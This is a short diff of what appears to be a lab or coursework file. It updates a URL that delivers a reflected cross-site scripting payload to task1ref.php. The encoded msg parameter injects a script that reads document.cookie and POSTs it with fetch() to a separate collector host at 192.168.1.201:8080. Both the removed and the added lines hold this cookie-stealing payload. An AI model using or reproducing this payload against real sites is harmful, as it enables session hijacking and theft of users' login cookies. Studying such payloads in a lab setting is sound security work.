@@ -1,3 +1,2 @@
-TODO: change this url to use the web server's ip and port 80
 
-http://localhost:8080/task1ref.php?msg=%3C%2Fp%3E%3Cscript%3Efetch(%22http%3A%2F%2F192.168.1.202%3A8080%22%2C{%0Amethod%3A%20%22POST%22%2C%0Abody%3AJSON.stringify({cookie%3AencodeURIComponent(document.cookie)})})%0A%3C%2Fscript%3E%3Cp%3E
+http://192.168.1.203:80/task1ref.php?msg=%3C%2Fp%3E%3Cscript%3Efetch(%22http%3A%2F%2F192.168.1.201%3A8080%22%2C{%0Amethod%3A%20%22POST%22%2C%0Abody%3AJSON.stringify({cookie%3AencodeURIComponent(document.cookie)})})%0A%3C%2Fscript%3E%3Cp%3E
